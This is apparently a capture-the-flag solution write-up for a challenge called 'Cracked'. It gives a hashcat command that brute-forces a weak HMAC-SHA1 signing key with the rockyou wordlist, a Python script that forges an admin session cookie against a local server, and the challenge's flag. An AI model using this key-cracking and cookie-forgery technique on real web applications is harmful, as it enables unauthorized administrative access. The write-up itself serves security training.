# Cracked
## Solution
The key used for HMAC signing is buteforceable with rockyou.
hashcat -m 150 -a 0 hash.txt rockyou.txt
The HMAC key is `6lmao9`. Using that to sign `{"admin": 1, "username": "guest"}` will give the flag.

```py
import requests
import hmac
from base64 import b64encode
from hashlib import sha1

KEY = "6lmao9"
session = '{"admin": 1, "username": "guest"}'
cookies = {
    "sig": b64encode(hmac.new(KEY.encode(), session.encode(), sha1).digest()).decode(),
    "session": b64encode(session.encode()).decode()
}
print(requests.get("http://localhost:8000", cookies=cookies).text)
```

Flag: `gigem{maybe_pick_a_better_password_next_time}`
